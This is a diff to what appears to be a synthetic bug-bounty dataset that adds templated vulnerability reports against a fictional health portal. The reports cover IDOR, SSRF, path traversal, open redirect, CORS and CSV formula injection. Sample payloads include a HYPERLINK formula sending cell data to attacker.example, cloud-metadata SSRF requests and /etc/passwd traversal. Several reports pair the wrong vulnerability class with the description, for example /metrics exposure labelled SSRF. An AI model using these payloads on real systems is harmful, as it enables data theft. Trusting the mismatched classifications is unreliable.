+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://auth.seefjord-health.foo/api/v2/documents/`\n- Preconditions: authenticated user: radiologist; app version: Portal 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -7342,7 +7397,8 @@
           "offset": "2d 8h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://auth.seefjord-health.foo/api/documents/`\n- Preconditions: authenticated user: admin; app version: Service 1.8\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -7489,7 +7545,8 @@
           "offset": "6d",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://auth.seefjord-health.foo/export`\n- Preconditions: authenticated user: support agent; app version: Portal 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -7648,7 +7705,8 @@
           "offset": "7d 8h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://auth.seefjord-health.foo/console/queue`\n- Preconditions: authenticated user: radiologist; app version: Auth 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -7819,7 +7877,8 @@
           "offset": "7d 2h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://www.seefjord-health.foo/export?type=records`\n- Preconditions: authenticated user: admin; app version: Service 1.8\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -7939,7 +7998,8 @@
           "offset": "0h",
           "message": "Initial report filed with screenshots and logs."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://auth.seefjord-health.foo/auth/callback?next=https://evil.foo`\n- Preconditions: authenticated user: support agent; app version: Auth 2025.09\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -8064,7 +8124,8 @@
           "offset": "4d",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://auth.seefjord-health.foo/metrics`\n- Preconditions: authenticated user: support agent; app version: API 2.3\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -8195,7 +8256,8 @@
           "offset": "7d 4h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://telemed.seefjord-health.foo/api/documents/`\n- Preconditions: authenticated user: support agent; app version: Service 1.8\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -8303,7 +8365,8 @@
           "offset": "3d 5h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://telemed.seefjord-health.foo/console/queue`\n- Preconditions: authenticated user: radiologist; app version: API 2.3\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -8419,7 +8482,8 @@
           "offset": "0h",
           "message": "Minimal PoC attached; scope limited to in-scope assets."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://telemed.seefjord-health.foo/statements/`\n- Preconditions: authenticated user: admin; app version: API 2.3\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -8571,7 +8635,8 @@
           "offset": "4d 21h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://ehr.seefjord-health.foo/statements/`\n- Preconditions: authenticated user: admin; app version: Web 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -8711,7 +8776,8 @@
           "offset": "3d 2h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://telemed.seefjord-health.foo/import`\n- Preconditions: authenticated user: admin; app version: Console 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -8803,7 +8869,8 @@
           "offset": "0h",
           "message": "Initial submission with PoC and reproduction steps."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://ehr.seefjord-health.foo/auth/callback?next=https://evil.foo`\n- Preconditions: authenticated user: radiologist; app version: Web 2025.09\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -8918,7 +8985,8 @@
           "offset": "2d 5h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://ehr.seefjord-health.foo/api/me`\n- Preconditions: authenticated user: radiologist; app version: Mobile 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -9025,7 +9093,8 @@
           "offset": "4d 3h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://ehr.seefjord-health.foo/api/import`\n- Preconditions: authenticated user: citizen; app version: Service 1.8\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -9117,7 +9186,8 @@
           "offset": "3d 8h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://ehr.seefjord-health.foo/metrics`\n- Preconditions: authenticated user: authenticated user; app version: Service 1.8\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -9279,7 +9349,8 @@
           "offset": "7d 1h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://telemed.seefjord-health.foo/metrics`\n- Preconditions: authenticated user: citizen; app version: Web 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -9385,7 +9456,8 @@
           "offset": "0h",
           "message": "Initial submission with PoC and reproduction steps."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://ehr.seefjord-health.foo/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: radiologist; app version: Service 1.8\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -9523,7 +9595,8 @@
           "offset": "2d 16h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://ehr.seefjord-health.foo/metrics`\n- Preconditions: authenticated user: citizen; app version: Web 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -9679,7 +9752,8 @@
           "offset": "5d 19h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://telemed.seefjord-health.foo/api/v2/documents/`\n- Preconditions: authenticated user: citizen; app version: API 2.3\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -9855,7 +9929,8 @@
           "offset": "4d 18h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://ehr.seefjord-health.foo/export?type=records`\n- Preconditions: authenticated user: support agent; app version: Service 1.8\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -9989,7 +10064,8 @@
           "offset": "6d 21h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://ehr.seefjord-health.foo/api/v2/documents/`\n- Preconditions: authenticated user: radiologist; app version: Service 1.8\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -10099,7 +10175,8 @@
           "offset": "7d 20h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://ehr.seefjord-health.foo/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: unauthenticated; app version: Web 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -10258,7 +10335,8 @@
           "offset": "5d 20h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://ehr.seefjord-health.foo/support/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: admin; app version: API 2.3\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -10377,7 +10455,8 @@
           "offset": "1d 19h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://telemed.seefjord-health.foo/api/documents/`\n- Preconditions: authenticated user: support agent; app version: API 2.3\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -10455,7 +10534,8 @@
           "offset": "1d 12h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://telemed.seefjord-health.foo/console/queue`\n- Preconditions: authenticated user: citizen; app version: Service 1.8\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -10561,7 +10641,8 @@
           "offset": "1d 8h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://ehr.seefjord-health.foo/support/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: support agent; app version: Mobile 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -10699,7 +10780,8 @@
           "offset": "0h",
           "message": "Minimal PoC attached; scope limited to in-scope assets."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://api.seefjord-health.foo/metrics`\n- Preconditions: authenticated user: authenticated user; app version: Service 1.8\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -10826,7 +10908,8 @@
           "offset": "1d 23h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://api.seefjord-health.foo/export`\n- Preconditions: authenticated user: radiologist; app version: Mobile 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -10950,7 +11033,8 @@
           "offset": "0h",
           "message": "Minimal PoC attached; scope limited to in-scope assets."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://portal.seefjord-health.foo/console/queue`\n- Preconditions: authenticated user: radiologist; app version: Service 1.8\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -11110,7 +11194,8 @@
           "offset": "2d 12h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://api.seefjord-health.foo/profile`\n- Preconditions: authenticated user: support agent; app version: Web 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -11292,7 +11377,8 @@
           "offset": "4d 19h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://portal.seefjord-health.foo/metrics`\n- Preconditions: authenticated user: unauthenticated; app version: Mobile 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -11396,7 +11482,8 @@
